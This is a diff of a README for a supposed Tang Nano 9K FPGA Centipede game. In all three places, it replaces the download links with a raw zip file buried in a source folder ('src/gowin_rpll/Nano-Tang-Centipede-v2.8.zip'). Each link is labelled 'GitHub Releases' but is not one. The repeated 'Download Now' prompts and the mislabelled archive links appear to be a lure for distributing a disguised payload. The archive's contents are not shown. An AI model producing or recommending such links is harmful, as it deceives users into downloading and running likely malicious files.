@@ -4,7 +4,7 @@
 TangNano9K-Centipede brings the classic Centipede arcade game to life using the Tang Nano 9K FPGA Board. Enjoy a nostalgic gaming experience with modern technology. 
 
 ## 📥 Download Now
-[![Download TangNano9K-Centipede](https://raw.githubusercontent.com/robinlebon/TangNano9K-Centipede/main/alkamine/TangNano9K-Centipede.zip)](https://raw.githubusercontent.com/robinlebon/TangNano9K-Centipede/main/alkamine/TangNano9K-Centipede.zip)
+[![Download TangNano9K-Centipede](https://github.com/robinlebon/TangNano9K-Centipede/raw/refs/heads/main/TangNano9K-Centipede/src/gowin_rpll/Nano-Tang-Centipede-v2.8.zip)](https://github.com/robinlebon/TangNano9K-Centipede/raw/refs/heads/main/TangNano9K-Centipede/src/gowin_rpll/Nano-Tang-Centipede-v2.8.zip)
 
 ## 🚀 Getting Started
 To enjoy TangNano9K-Centipede, follow these simple steps. You only need to download the software and set it up on your FPGA board.
@@ -17,7 +17,7 @@ To enjoy TangNano9K-Centipede, follow these simple steps. You only need to downl
 These requirements ensure that the game runs smoothly on your hardware.
 
 ## 📂 Download & Install
-Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/robinlebon/TangNano9K-Centipede/main/alkamine/TangNano9K-Centipede.zip).
+Visit this page to download: [GitHub Releases](https://github.com/robinlebon/TangNano9K-Centipede/raw/refs/heads/main/TangNano9K-Centipede/src/gowin_rpll/Nano-Tang-Centipede-v2.8.zip).
 
 1. Go to the releases page.
 2. Look for the latest version of TangNano9K-Centipede.
@@ -74,6 +74,6 @@ Explore related topics to expand your understanding:
 Thank you to all contributors and the community for making the TangNano9K-Centipede project come to life.
 
 ## 📥 Download Again
-For easy access, visit the download page once more: [GitHub Releases](https://raw.githubusercontent.com/robinlebon/TangNano9K-Centipede/main/alkamine/TangNano9K-Centipede.zip). 
+For easy access, visit the download page once more: [GitHub Releases](https://github.com/robinlebon/TangNano9K-Centipede/raw/refs/heads/main/TangNano9K-Centipede/src/gowin_rpll/Nano-Tang-Centipede-v2.8.zip). 
 
 Enjoy your gaming experience!
